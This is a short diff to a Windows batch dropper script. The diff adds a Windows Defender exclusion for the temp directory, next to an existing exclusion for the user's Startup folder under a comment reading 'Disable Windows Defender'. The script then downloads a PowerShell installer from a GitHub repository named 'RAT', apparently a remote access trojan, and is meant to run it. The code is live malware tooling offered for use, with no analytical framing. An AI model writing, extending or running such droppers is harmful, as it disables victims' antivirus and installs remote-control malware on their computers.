@@ -32,6 +32,7 @@ if '%errorlevel%' NEQ '0' (
 
 REM Disable Windows Defender
 powershell -command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
+powershell -command "Add-MpPreference -ExclusionPath '$env:temp'"
 
 REM Download and run PowerShell script
 powershell -command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1 -OutFile installer.ps1"
